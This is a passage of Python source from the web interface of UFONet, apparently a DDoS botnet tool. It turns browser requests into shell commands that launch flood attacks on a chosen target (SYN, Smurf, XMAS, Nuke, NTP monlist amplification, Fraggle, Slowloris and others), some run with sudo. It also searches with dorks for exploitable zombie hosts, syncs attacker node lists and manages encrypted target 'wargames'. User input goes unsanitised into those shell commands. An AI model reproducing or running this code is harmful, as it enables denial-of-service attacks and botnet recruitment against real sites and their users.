            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_upload_community_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_test_army_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close() 
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_test_army_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_test_all_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_test_all_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_test_offline_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_test_offline_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_test_rpcs":
            self.pages["/cmd_test_rpcs"] = "<pre>Waiting for XML-RPC testing results...</pre>"
            runcmd = "("+python_version+" -i ufonet --test-rpc " + cmd_options + "|tee /tmp/out) &"
        if page == "/cmd_test_rpcs_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_test_rpcs_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_attack":
            self.pages["/cmd_attack"] = "<pre>Waiting for attacking results...</pre>"
            cmd = ""
            flag_ufosyn = None
            flag_spray = None
            flag_smurf = None
            flag_xmas = None
            flag_nuke = None
            flag_tachyon = None
            flag_monlist = None
            flag_fraggle = None
            flag_sniper = None
            flag_ufoack = None
            flag_uforst = None
            flag_droper = None
            flag_overlap = None
            flag_pinger = None
            flag_ufoudp = None
            nonroot_cmd = "("+python_version+" -i ufonet -a '"+pGet["target"]+"' -b '"+pGet["path"]+"' -r '"+pGet["rounds"]+"' "
            root_cmd = "(sudo "+python_version+" -i ufonet -a '"+pGet["target"]+"' -b '"+pGet["path"]+"' -r '"+pGet["rounds"]+"' "
            end_cmd = ""+cmd_options + "|tee /tmp/out) &"
            if pGet["dbstress"]:
                cmd += "--db '" +str(pGet["dbstress"])+ "' "
            if pGet["loic"]:
                cmd += "--loic '" +str(pGet["loic"])+ "' "
            if pGet["loris"]:
                cmd += "--loris '" +str(pGet["loris"])+ "' "
            if pGet["ufosyn"]:
                cmd += "--ufosyn '" +str(pGet["ufosyn"])+ "' "
                flag_ufosyn = True
            if pGet["spray"]:
                cmd += "--spray '" +str(pGet["spray"])+ "' "
                flag_spray = True
            if pGet["smurf"]:
                cmd += "--smurf '" +str(pGet["smurf"])+ "' "
                flag_smurf = True
            if pGet["xmas"]:
                cmd += "--xmas '" +str(pGet["xmas"])+ "' "
                flag_xmas = True
            if pGet["nuke"]:
                cmd += "--nuke '" +str(pGet["nuke"])+ "' "
                flag_nuke = True
            if pGet["tachyon"]:
                cmd += "--tachyon '" +str(pGet["tachyon"])+ "' "
                flag_tachyon = True
            if pGet["monlist"]:
                cmd += "--monlist '" +str(pGet["monlist"])+ "' "
                flag_monlist = True
            if pGet["fraggle"]:
                cmd += "--fraggle '" +str(pGet["fraggle"])+ "' "
                flag_fraggle = True
            if pGet["sniper"]:
                cmd += "--sniper '" +str(pGet["sniper"])+ "' "
                flag_sniper = True
            if pGet["ufoack"]:
                cmd += "--ufoack '" +str(pGet["ufoack"])+ "' "
                flag_ufoack = True
            if pGet["uforst"]:
                cmd += "--uforst '" +str(pGet["uforst"])+ "' "
                flag_uforst = True
            if pGet["droper"]:
                cmd += "--droper '" +str(pGet["droper"])+ "' "
                flag_droper = True
            if pGet["overlap"]:
                cmd += "--overlap '" +str(pGet["overlap"])+ "' "
                flag_overlap = True
            if pGet["pinger"]:
                cmd += "--pinger '" +str(pGet["pinger"])+ "' "
                flag_pinger = True
            if pGet["ufoudp"]:
                cmd += "--ufoudp '" +str(pGet["ufoudp"])+ "' "
                flag_ufoudp = True
            if not flag_monlist and not flag_tachyon and not flag_nuke and not flag_xmas and not flag_smurf and not flag_spray and not flag_ufosyn and not flag_fraggle and not flag_sniper and not flag_ufoack and not flag_uforst and not flag_droper and not flag_overlap and not flag_pinger and not flag_ufoudp:
                cmd = nonroot_cmd + cmd # non root required (LOIC, LORIS)
            if flag_ufosyn == True or flag_spray == True or flag_smurf == True or flag_xmas == True or flag_nuke == True or flag_tachyon == True or flag_monlist == True or flag_fraggle == True or flag_sniper == True or flag_ufoack == True or flag_uforst == True or flag_droper == True or flag_overlap == True or flag_pinger == True or flag_ufoudp == True:
                cmd = root_cmd + cmd # root required (UFOSYN, SPRAY, SMURF, XMAS, NUKE, TACHYON, MONLIST, FRAGGLE, SNIPER, UFOACK, UFORST, DROPER, OVERLAP, PINGER, UFOUDP)                    
            runcmd = cmd + end_cmd
        if page == "/cmd_attack_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close() 
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_attack_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_inspect":
            self.pages["/cmd_inspect"] = "<pre>Waiting for inspecting results...</pre>"
            target = pGet["target"]
            target=urllib.parse.unquote(target) 
            runcmd = "("+python_version+" -i ufonet -i '"+target+"' "+ cmd_options + "|tee /tmp/out) &"
        if page == "/cmd_inspect_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_inspect_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_abduction":
            self.pages["/cmd_abduction"] = "<pre>Waiting for abduction results...</pre>"
            target = pGet["target"]
            target=urllib.parse.unquote(target)
            runcmd = "("+python_version+" -i ufonet -x '"+target+"' "+ cmd_options + "|tee /tmp/out) &"
        if page == "/cmd_abduction_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_abduction_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_search":
            self.pages["/cmd_search"] = "<pre>Waiting for search engines results...</pre>"
            if pGet["dork_list"] == "on": # search using dork list (file: dorks.txt)
                if pGet["all_engines"] == "on": # search using all search engines (and exclude those set by the user)
                    if pGet["exclude_engines"]:
                        runcmd = "("+python_version+" -i ufonet --sd 'botnet/dorks.txt' --sa '"+pGet["exclude_engines"]+"' " + cmd_options + "|tee /tmp/out) &"
                    else:
                        runcmd = "("+python_version+" -i ufonet --sd 'botnet/dorks.txt' --sa " + cmd_options + "|tee /tmp/out) &"
                else: # search using a search engine
                    runcmd = "("+python_version+" -i ufonet --sd 'botnet/dorks.txt' --se '"+pGet["s_engine"]+"' " + cmd_options + "|tee /tmp/out) &"
            else: # search using a pattern
                if pGet["autosearch"] == "on": # search using auto-search mod
                    if pGet["exclude_engines"]:
                        runcmd = "("+python_version+" -i ufonet --auto-search '"+pGet["exclude_engines"]+"' " + cmd_options + "|tee /tmp/out) &"
                    else:
                        runcmd = "("+python_version+" -i ufonet --auto-search " + cmd_options + "|tee /tmp/out) &"
                else:
                    if pGet["all_engines"] == "on": # search using all search engines
                        if pGet["exclude_engines"]:
                            runcmd = "("+python_version+" -i ufonet -s '"+pGet["dork"]+"' --sa '"+pGet["exclude_engines"]+"' " + cmd_options + "|tee /tmp/out) &"
                        else:
                            runcmd = "("+python_version+" -i ufonet -s '"+pGet["dork"]+"' --sa " + cmd_options + "|tee /tmp/out) &"
                    else: # search using a search engine
                        runcmd = "("+python_version+" -i ufonet -s '"+pGet["dork"]+"' --se '"+pGet["s_engine"]+"' " + cmd_options + "|tee /tmp/out) &"
        if page == "/cmd_search_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_search_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_refresh_blackholes":
            self.pages["/cmd_refresh_blackholes"] = "<pre>Waiting for 'blackhole' reply...</pre>"
            blackhole_ip = pGet["blackholes_source"]
            blackhole_ip = urllib.parse.unquote(blackhole_ip)
            try:
                blackholes = urllib.request.urlopen('http://'+blackhole_ip+'/ufonet/nodes.dat').read().decode('utf-8')
                f = open(self.blackholes, "w") # write updates to nodes.dat
                f.write(blackholes)
                f.close()
                self.blackholes_text = blackholes
            except:
                blackholes = "[Error] [AI] Something wrong downloading. Try it again or using another source...\n"
            end_mark = "\n[Info] [AI] End of blackholes list (nodes.dat). -> [Refreshing!]"
            f = open("/tmp/out", "w")
            f.write(str(blackholes))
            f.write(end_mark)
            f.close()
        if page == "/cmd_refresh_blackholes_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_refresh_blackholes_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_refresh_news":
            self.pages["/cmd_refresh_news"] = "<pre>Waiting for 'blackhole' reply...</pre>"
            blackhole_ip = pGet["news_source"]
            blackhole_ip = urllib.parse.unquote(blackhole_ip)
            try:
                news = urllib.request.urlopen('http://'+blackhole_ip+'/ufonet/news.txt').read().decode('utf-8')
                f = open(self.news, "w") # write updates to news.txt
                f.write(news)
                f.close()
                self.news_text = news
            except:
                news = "[Error] [AI] Something wrong downloading. Try it again or using another source....\n"
            end_mark = "\n[Info] [AI] End of news feed. -> [Refreshing!]"
            f = open("/tmp/out", "w")
            f.write(str(news))
            f.write(end_mark)
            f.close()
        if page == "/cmd_refresh_news_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_refresh_news_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_sync_wargames":
            self.pages["/cmd_sync_wargames"] = "<pre>Waiting for 'blackhole' reply...</pre>"
            blackhole_ip = pGet["wargames_source"]
            blackhole_ip = urllib.parse.unquote(blackhole_ip)
            try:
                wargames = urllib.request.urlopen('http://'+blackhole_ip+'/ufonet/wargames.txt').read().decode('utf-8')
                f = open(self.wargames_file, "w") # write updates to wargames.txt
                f.write(wargames)
                f.close()
                self.wargames_text = wargames
            except:
                wargames = "[Error] [AI] Something wrong downloading. Try it again or using another source...\n"
            end_mark = "\n[Info] [AI] End of transmission. -> [Refreshing!]"
            f = open("/tmp/out", "w")
            f.write(str(wargames))
            f.write(end_mark)
            f.close()
        if page == "/cmd_sync_wargames_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                stream = f.read()
                stream = re.sub("(.{100})", "\\1\n", stream, 0, re.DOTALL) # regex magics! (set visual stream to 100 chars after \n)
                self.pages["/cmd_sync_wargames_update"] = "<pre>"+stream+"<pre>"
        if page == "/cmd_sync_links":
            self.pages["/cmd_sync_links"] = "<pre>Waiting for 'blackhole' reply...</pre>"
            blackhole_ip = pGet["link_source"]
            blackhole_ip = urllib.parse.unquote(blackhole_ip)
            try:
                links = urllib.request.urlopen('http://'+blackhole_ip+'/ufonet/links.txt').read().decode('utf-8')
                f = open(self.links_file, "w") # write updates to links.txt
                f.write(links)
                f.close()
                self.links_text = links
            except:
                links = "[Error] [AI] Something wrong downloading. Try it again or using another source...\n"
            end_mark = "\n[Info] [AI] End of transmission. -> [Refreshing!]"
            f = open("/tmp/out", "w")
            f.write(str(links))
            f.write(end_mark)
            f.close()
        if page == "/cmd_sync_links_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                stream = f.read()
                stream = re.sub("(.{100})", "\\1\n", stream, 0, re.DOTALL) # regex magics! (set visual stream to 100 chars after \n)
                self.pages["/cmd_sync_links_update"] = "<pre>"+stream+"<pre>"
        if page == "/cmd_sync_globalnet":
            self.pages["/cmd_sync_globalnet"] = "<pre>Waiting for 'blackhole' reply...</pre>"
            blackhole_ip = pGet["globalnet_source"]
            blackhole_ip = urllib.parse.unquote(blackhole_ip)
            try:
                globalnet = urllib.request.urlopen('http://'+blackhole_ip+'/ufonet/globalnet.txt').read().decode('utf-8')
                f = open(self.globalnet_file, "w") # write updates to globalnet.txt
                f.write(globalnet)
                f.close()
                self.globalnet_text = globalnet
            except:
                globalnet = "[Error] [AI] Something wrong downloading. Try it again or using another source...\n"
            end_mark = "\n[Info] [AI] End of transmission. -> [Refreshing!]"
            f = open("/tmp/out", "w")
            f.write(str(globalnet))
            f.write(end_mark)
            f.close()
        if page == "/cmd_sync_globalnet_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                stream = f.read()
                stream = re.sub("(.{100})", "\\1\n", stream, 0, re.DOTALL) # regex magics! (set visual stream to 100 chars after \n)
                self.pages["/cmd_sync_globalnet_update"] = "<pre>"+stream+"<pre>"
        if page == "/cmd_sync_streams":
            self.pages["/cmd_sync_streams"] = "<pre>Waiting for 'blackhole' reply...</pre>"
            blackhole_ip = pGet["stream_source"]
            blackhole_ip = urllib.parse.unquote(blackhole_ip)
            try:
                streams = urllib.request.urlopen('http://'+blackhole_ip+'/ufonet/streams.txt').read().decode('utf-8')
                f = open(self.streams_file, "w") # write updates to streams.txt
                f.write(streams)
                f.close()
                self.streams_text = streams
            except:
                streams = "[Error] [AI] Something wrong downloading. Try it again or using another source...\n"
            end_mark = "\n[Info] [AI] End of transmission. -> [Refreshing!]"
            f = open("/tmp/out", "w")
            f.write(str(streams))
            f.write(end_mark)
            f.close()
        if page == "/cmd_sync_streams_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                stream = f.read()
                stream = re.sub("(.{100})", "\\1\n", stream, 0, re.DOTALL) # regex magics! (set visual stream to 100 chars after \n)
                self.pages["/cmd_sync_streams_update"] = "<pre>"+stream+"<pre>"
        if page == "/cmd_refresh_missions":
            self.pages["/cmd_refresh_missions"] = "<pre>Waiting for 'blackhole' reply...</pre>"
            blackhole_ip = pGet["missions_source"]
            blackhole_ip = urllib.parse.unquote(blackhole_ip)
            try:
                missions = urllib.request.urlopen('http://'+blackhole_ip+'/ufonet/missions.txt').read().decode('utf-8')
                f = open(self.missions, "w") # write updates to missions.txt
                f.write(missions)
                f.close()
                self.missions_text = missions
            except:
                missions = "[Error] [AI] Something wrong downloading. Try it again or using another source...\n"
            end_mark = "\n[Info] [AI] End of missions feed. -> [Refreshing!]"
            f = open("/tmp/out", "w")
            f.write(str(missions))
            f.write(end_mark)
            f.close()
        if page == "/cmd_refresh_missions_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_refresh_missions_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_refresh_ranking":
            self.pages["/cmd_refresh_ranking"] = "<pre>Waiting for 'blackhole' reply...</pre>"
            ranking_ip = pGet["ranking_source"]
            ranking_ip = urllib.parse.unquote(ranking_ip)
            try:
                ranking = urllib.request.urlopen('http://'+ranking_ip+'/ufonet/grid.txt').read().decode('utf-8')
                f = open(self.grid_file, "w") # write updates to grid.txt
                f.write(ranking)
                f.close()
                self.ranking_text = ranking
            except:
                ranking = "[Error] [AI] Something wrong downloading. Try it again or using another source...\n"
            end_mark = "\n[Info] [AI] End of ranking feed. -> [Refreshing!]"
            f = open("/tmp/out", "w")
            f.write(str(ranking))
            f.write(end_mark)
            f.close()
        if page == "/cmd_refresh_ranking_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_refresh_ranking_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_sync_grid":
            self.pages["/cmd_sync_grid"] = "<pre>Waiting for 'blackhole' reply...</pre>"
            blackhole_ip = pGet["grid_source"]
            blackhole_ip = urllib.parse.unquote(blackhole_ip)
            try:
                grid = urllib.request.urlopen('http://'+blackhole_ip+'/ufonet/grid.txt').read().decode('utf-8')
                f = open(self.grid_file, "w") # write updates to grid.txt
                f.write(grid)
                f.close()
                self.grid_text = grid
            except:
                grid = "[Error] [AI] Something wrong downloading. Try it again or using another source...\n"
            end_mark = "\n[Info] [AI] End of transmission. -> [Refreshing!]"
            f = open("/tmp/out", "w")
            f.write(str(grid))
            f.write(end_mark)
            f.close()
        if page == "/cmd_sync_grid_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                stream = f.read()
                stream = re.sub("(.{100})", "\\1\n", stream, 0, re.DOTALL) # regex magics! (set visual stream to 100 chars after \n)
                self.pages["/cmd_sync_grid_update"] = "<pre>"+stream+"<pre>"
        if page == "/cmd_job_remove":
            self.pages["/cmd_job_remove"] = "<pre>Removing wargame from your list...</pre>"
            try:
                job_id = pGet["id"]
            except:
                job_id = ""
            if job_id is not "":
                self.list_wargames.reverse() 
                try:
                    job_task = self.list_wargames[(int(job_id)-1)]
                    f = open(self.wargames_file,"r")
                    ls = f.readlines()
                    f.close()
                    f = open(self.wargames_file,"w")
                    for l in ls:
                        if str(l) != str(job_task):
                            f.write(l)
                    f.close()
                except:
                    pass
        if page == "/cmd_job_remove_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_job_remove_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_job_remove_all":
            self.pages["/cmd_job_remove_all"] = "<pre>Purging ALL -CLOSED- wargames from your list...</pre>"
            try:
                key_params = pGet["key"]
                sep = ","
                key = key_params.rsplit(sep, 1)[0]
            except:
                key = ""
            if key is not "":
                try:
                    self.list_wargames.reverse()
                    now = strftime("%d-%m-%Y %H:%M:%S", gmtime())
                    now = strptime(now, "%d-%m-%Y %H:%M:%S")
                    f = open(self.wargames_file,"r")
                    ls = f.readlines()
                    f.close()
                    f = open(self.wargames_file,"w")
                    sep = wargames_msg_sep
                    for l in ls:
                        job_estimated = l.rsplit(sep, 1)[1]
                        self.decrypt(key, job_estimated)
                        if self.decryptedtext:
                            job_estimated = self.decryptedtext
                        else:
                            job_estimated = now
                        self.decryptedtext = ""
                        job_estimated = strptime(job_estimated, "%d-%m-%Y %H:%M:%S")
                        if (now >= job_estimated) == False: # -ONGOING-
                            f.write(l)
                    f.close()
                except:
                    pass
        if page == "/cmd_job_remove_all_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_job_remove_all_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_edit_supply":
            self.pages["/cmd_edit_supply"] = "<pre>Changing 'Global Army Supply' configuration...</pre>"
            try:
                supply_botnet = pGet["botnet"]
                supply_loic = pGet["loic"]
                supply_loris = pGet["loris"]
                supply_ufosyn = pGet["ufosyn"]
                supply_spray = pGet["spray"]
                supply_smurf = pGet["smurf"]
                supply_xmas = pGet["xmas"]
                supply_nuke = pGet["nuke"]
                supply_tachyon = pGet["tachyon"]
                supply_monlist = pGet["monlist"]
                supply_fraggle = pGet["fraggle"]
                supply_sniper = pGet["sniper"]
                supply_ufoack = pGet["ufoack"]
                supply_uforst = pGet["uforst"]
                supply_droper = pGet["droper"]
                supply_overlap = pGet["overlap"]
                supply_pinger = pGet["pinger"]
                supply_ufoudp = pGet["ufoudp"]
            except: # default global supply army
                supply_botnet = 1
                supply_loic = 0
                supply_loris = 0
                supply_ufosyn = 0
                supply_spray = 0
                supply_smurf = 0
                supply_xmas = 0
                supply_nuke = 0
                supply_tachyon = 0
                supply_monlist = 0
                supply_fraggle = 0
                supply_sniper = 0
                supply_ufoack = 0
                supply_uforst = 0
                supply_droper = 0
                supply_overlap = 0
                supply_pinger = 0
                supply_ufoudp = 0
            with open(self.mothership_supplycfg_file, "w") as f:
                json.dump({"botnet": supply_botnet, "loic": supply_loic, "loris": supply_loris, "ufosyn": supply_ufosyn, "spray": supply_spray, "smurf": supply_smurf, "xmas": supply_xmas, "nuke": supply_nuke, "tachyon": supply_tachyon, "monlist": supply_monlist, "fraggle": supply_fraggle, "sniper": supply_sniper, "ufoack": supply_ufoack, "uforst": supply_uforst, "droper": supply_droper, "overlap": supply_overlap, "pinger": supply_pinger, "ufoudp": supply_ufoudp}, f, indent=4)
        if page == "/cmd_job_add":
            self.pages["/cmd_job_add"] = "<pre>Adding wargame to your list...</pre>"
            try:
                job_params = pGet["id"]
                sep = ","
                job_id = job_params.rsplit(sep, 1)[0]
            except:
                job_id = ""
            if job_id is not "":
                self.list_wargames.reverse() 
                try:
                    job_task = self.list_wargames[(int(job_id)-1)]
                    f = open(self.wargames_file,"r")
                    ls = f.readlines()
                    f.close()
                    f = open(self.wargames_file,"w")
                    sep = wargames_msg_sep
                    for l in ls:
                        if str(l) != str(job_task):
                            f.write(l)
                        else:
                            job_t2 = job_task.rsplit(sep, 1)[0]
                            job_creation = job_t2.rsplit(sep, 1)[0]
                            job_target = job_t2.rsplit(sep, 1)[1]
                            job_estimated = job_task.rsplit(sep, 1)[1]
                            l = str(job_creation) + wargames_msg_sep + str(job_target) + "!!!#-#" + str(job_estimated) # '!!!' target marked as job
                            f.write(l)
                    f.close()
                except:
                    pass
        if page == "/cmd_job_add_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_job_add_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_job_add_all":
            self.pages["/cmd_job_add_all"] = "<pre>Engaging ALL -ONGOING- wargames... ;-)</pre>"
            try:
                self.list_wargames.reverse()
                f = open(self.wargames_file,"r")
                ls = f.readlines()
                f.close()
                f = open(self.wargames_file,"w")
                sep = wargames_msg_sep
                for l in ls:
                    job_t2 = l.rsplit(sep, 1)[0]
                    job_creation = job_t2.rsplit(sep, 1)[0]
                    job_target = job_t2.rsplit(sep, 1)[1]
                    job_estimated = l.rsplit(sep, 1)[1]
                    if not "!!!" in job_target:
                        l = str(job_creation) + wargames_msg_sep + str(job_target) + "!!!#-#" + str(job_estimated)
                    else:
                        l = str(job_creation) + wargames_msg_sep + str(job_target) + wargames_msg_sep + str(job_estimated)
                    f.write(l)
                f.close()
            except:
                pass
        if page == "/cmd_job_add_all_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_job_add_all_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_job_cancel":
            self.pages["/cmd_job_cancel"] = "<pre>Canceling wargame from your list...</pre>"
            try:
                job_params = pGet["id"]
                sep = ","
                job_id = job_params.rsplit(sep, 1)[0]
            except:
                job_id = ""
            if job_id is not "":
                self.list_wargames.reverse() 
                try:
                    job_task = self.list_wargames[(int(job_id)-1)]
                    f = open(self.wargames_file,"r")
                    ls = f.readlines()
                    f.close()
                    f = open(self.wargames_file,"w")
                    for l in ls:
                        if str(l) != str(job_task):
                            f.write(l)
                        else:
                            sep = wargames_msg_sep
                            job_t2 = job_task.rsplit(sep, 1)[0]
                            job_creation = job_t2.rsplit(sep, 1)[0]
                            job_target = job_t2.rsplit(sep, 1)[1]
                            job_target = job_target.replace("!!!","") # undo target marked as job (unjob)
                            job_estimated = job_task.rsplit(sep, 1)[1]
                            l = str(job_creation) + wargames_msg_sep + str(job_target) + wargames_msg_sep + str(job_estimated)
                            f.write(l)
                    f.close()
                except:
                    pass
        if page == "/cmd_job_cancel_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_job_cancel_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_job_cancel_all":
            self.pages["/cmd_job_cancel_all"] = "<pre>Canceling ALL -JOINED- wargames from your list...</pre>"
            try:
                self.list_wargames.reverse()
                f = open(self.wargames_file,"r")
                ls = f.readlines()
                f.close()
                f = open(self.wargames_file,"w")
                sep = wargames_msg_sep
                for l in ls:
                    job_t2 = l.rsplit(sep, 1)[0]
                    job_creation = job_t2.rsplit(sep, 1)[0]
                    job_target = job_t2.rsplit(sep, 1)[1]
                    job_target = job_target.replace("!!!","") # undo target marked as job (unjob)
                    job_estimated = l.rsplit(sep, 1)[1]
                    l = str(job_creation) + wargames_msg_sep + str(job_target) + wargames_msg_sep + str(job_estimated)
                    f.write(l)
                f.close()
            except:
                pass
        if page == "/cmd_job_cancel_all_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_job_cancel_all_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_job_filter":
            try:
                job_filter = pGet["filter"]
                job_key = pGet["key"]
            except:
                job_filter = "creation"
                job_key = str(self.crypto_key)
            self.pages["/cmd_job_filter"] = "<pre>Ordering wargames by: "+job_filter+"</pre>"
            nodec_text = "KEY?"
            try:
                wargames_items=[]
                with open(self.wargames_file) as f:
                    ls = f.read().splitlines()
                f.close()
                f = open(self.wargames_file,"w")
                for j in ls:
                    if wargames_msg_sep in j:
                        m = j.split(wargames_msg_sep)
                        wargames_creation = m[0] # creation date
                        self.decrypt(job_key, wargames_creation)
                        if self.decryptedtext:
                            wargames_creation = self.decryptedtext
                        else:
                            wargames_creation = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        wargames_target = m[1] # target
                        self.decrypt(job_key, wargames_target)
                        if self.decryptedtext:
                            wargames_target = self.decryptedtext
                            if wargames_target.startswith("www."):
                                wargames_target = wargames_target.replace("www.","")
                        else:
                            wargames_target = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        wargames_estimated = m[2] # estimated date
                        self.decrypt(job_key, wargames_estimated)
                        if self.decryptedtext:
                            wargames_estimated = self.decryptedtext
                        else:
                            wargames_estimated = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        wargames_creation = strptime(wargames_creation, "%d-%m-%Y %H:%M:%S")
                        wargames_estimated = strptime(wargames_estimated, "%d-%m-%Y %H:%M:%S")
                        wargames_items.append([wargames_creation,wargames_target,wargames_estimated])
                if job_filter == "creation":
                    wargames_items=sorted(wargames_items,key=lambda x:x[0]) # sorted by creation
                elif job_filter == "target": 
                    wargames_items=sorted(wargames_items,key=lambda x:x[1]) # sorted by target
                elif job_filter == "estimated": 
                    wargames_items=sorted(wargames_items,key=lambda x:x[2]) # sorted by estimated
                else:
                    wargames_items=sorted(wargames_items,key=lambda x:x[0]) # sorted by creation
                for i in wargames_items:
                    wargames_creation = i[0]
                    wargames_creation = strftime("%d-%m-%Y %H:%M:%S", wargames_creation)
                    self.encrypt(job_key, wargames_creation)
                    if self.encryptedtext:
                        wargames_creation = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    wargames_target = str(i[1])
                    self.encrypt(job_key, wargames_target)
                    if self.encryptedtext:
                        wargames_target = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    wargames_estimated = i[2]
                    wargames_estimated = strftime("%d-%m-%Y %H:%M:%S", wargames_estimated)
                    self.encrypt(job_key, wargames_estimated)
                    if self.encryptedtext:
                        wargames_estimated = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer  
                    l = str(wargames_creation) + wargames_msg_sep + str(wargames_target) + wargames_msg_sep + str(wargames_estimated)
                    f.write(l + os.linesep)
                f.close()
            except:
                pass
        if page == "/cmd_job_filter_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_job_filter_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_link_filter":
            try:
                link_filter = pGet["filter"]
                link_key = pGet["key"]
            except:
                link_filter = "creation"
                link_key = str(self.crypto_key)
            self.pages["/cmd_link_filter"] = "<pre>Ordering links by: "+link_filter+"</pre>"
            nodec_text = "KEY?"
            try:
                links_items=[]
                with open(self.links_file) as f:
                    ls = f.read().splitlines()
                f.close()
                f = open(self.links_file,"w")
                for j in ls:
                    if links_msg_sep in j:
                        m = j.split(links_msg_sep)
                        link_creation = m[0] # creation date
                        self.decrypt(link_key, link_creation)
                        if self.decryptedtext:
                            link_creation = self.decryptedtext
                        else:
                            link_creation = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        link_url = m[1] # url
                        self.decrypt(link_key, link_url)
                        if self.decryptedtext:
                            link_url = self.decryptedtext
                            if link_url.startswith("www."):
                                link_url = link_url.replace("www.","")
                        else:
                            link_url = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        link_topic = m[2] # topic
                        self.decrypt(link_key, link_topic)
                        if self.decryptedtext:
                            link_topic = self.decryptedtext
                        else:
                            link_topic = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        link_creation = strptime(link_creation, "%d-%m-%Y %H:%M:%S")
                        links_items.append([link_creation,link_url,link_topic])
                if link_filter == "creation":
                    links_items=sorted(links_items,key=lambda x:x[0]) # sorted by creation
                elif link_filter == "url": 
                    links_items=sorted(links_items,key=lambda x:x[1]) # sorted by url
                elif link_filter == "topic": 
                    links_items=sorted(links_items,key=lambda x:x[2]) # sorted by topic
                else:
                    links_items=sorted(links_items,key=lambda x:x[0]) # sorted by creation
                for i in links_items:
                    link_creation = i[0]
                    link_creation = strftime("%d-%m-%Y %H:%M:%S", link_creation)
                    self.encrypt(link_key, link_creation)
                    if self.encryptedtext:
                        link_creation = self.encryptedtext
                    else:
                        link_creation = nodec_text
                    self.encryptedtext = "" # clean encryptedtext buffer
                    link_url = str(i[1])
                    self.encrypt(link_key, link_url)
                    if self.encryptedtext:
                        link_url = self.encryptedtext
                    else:
                        link_url = nodec_text
                    self.encryptedtext = "" # clean encryptedtext buffer
                    link_topic = str(i[2])
